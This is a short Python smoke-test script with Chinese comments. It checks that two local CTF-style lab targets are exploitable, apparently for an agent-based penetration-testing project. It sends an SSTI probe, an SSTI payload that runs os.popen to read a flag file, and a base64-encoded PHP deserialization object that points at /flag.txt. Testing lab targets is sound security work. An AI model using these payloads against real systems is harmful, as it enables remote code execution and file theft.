"""web-002 / web-003 靶机行为冒烟测试：独立验证漏洞真可用（不依赖主 Agent / LLM）。

用法：.venv/Scripts/python.exe scripts/_smoke_web_targets.py
"""
from __future__ import annotations

import base64

import httpx

SSTI = "http://127.0.0.1:9002/web-002"
UNSER = "http://127.0.0.1:9003/web-003"


def main() -> None:
    # 1) SSTI 探测 {{7*7}} -> 49
    r1 = httpx.get(SSTI, params={"name": "{{7*7}}"}, timeout=10)
    print("[SSTI probe] %s" % r1.text[:120])

    # 2) SSTI RCE -> 读 flag_ssti.txt
    r2 = httpx.get(
        SSTI,
        params={"name": "{{ __import__('os').popen('cat flag_ssti.txt 2>nul || type flag_ssti.txt').read() }}"},
        timeout=10,
    )
    print("[SSTI rce]   %s" % r2.text[:120])

    # 3) 反序列化 -> base64 对象含 file=/flag.txt
    obj = 'O:5:"Class":1:{s:4:"file";s:9:"/flag.txt";}'
    data = base64.b64encode(obj.encode()).decode()
    r3 = httpx.get(UNSER, params={"data": data}, timeout=10)
    print("[UNSER]      %s" % r3.text[:120])


if __name__ == "__main__":
    main()
